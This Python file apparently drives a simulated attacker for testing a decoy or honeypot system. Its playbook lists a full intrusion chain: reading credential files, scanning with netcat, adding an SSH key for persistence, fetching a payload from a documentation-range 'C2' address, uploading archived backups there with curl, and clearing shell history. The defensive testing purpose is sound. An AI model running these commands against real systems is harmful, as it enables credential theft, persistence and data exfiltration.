"""Scripted intruder used by the mocked scenarios.

The order follows a typical hands-on-keyboard intrusion after an SSH foothold:
orient, hunt for credentials, look around the network, move, persist, collect,
exfiltrate, clean up. Placeholders are filled in from the live session, so the
script reacts to whatever decoys the planner actually deployed.

198.51.100.0/24 is a documentation range (RFC 5737): the "C2 server" does not
exist, and decoys have no egress anyway.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Step:
    command: str
    pause: float = 1.2  # seconds of "thinking time" before the command


C2 = "198.51.100.23"

INTRUSION_PLAYBOOK: tuple[Step, ...] = (
    Step("whoami", 0.8),
    Step("id"),
    Step("uname -a"),
    Step("cat /etc/passwd", 1.6),
    Step("ps aux"),
    Step("ip a"),
    Step("ls -la ~", 1.8),
    Step("cat ~/.bash_history", 1.4),
    Step("cat ~/.aws/credentials", 2.0),
    Step("find / -name '*.php'", 1.5),
    Step("cat /var/www/html/config.php", 1.8),
    Step("sudo -l", 1.5),
    Step("cat /etc/hosts", 1.2),
    Step("for h in $(seq 1 30); do nc -zv -w1 {subnet}.$h 3306; done", 2.4),
    Step("mysql -h {db_host} -u app -p{db_password} -e 'show databases'", 2.6),
    Step("echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPhantomDecoyKey ops@jump' "
         ">> ~/.ssh/authorized_keys", 2.0),
    Step(f"wget http://{C2}/lin.sh -O /tmp/.cache-update", 2.2),
    Step("chmod +x /tmp/.cache-update", 0.8),
    Step("tar czf /tmp/.b.tgz /opt/backup", 1.8),
    Step(f"curl -F 'f=@/tmp/.b.tgz' http://{C2}/u", 2.0),
    Step("history -c", 1.0),
)
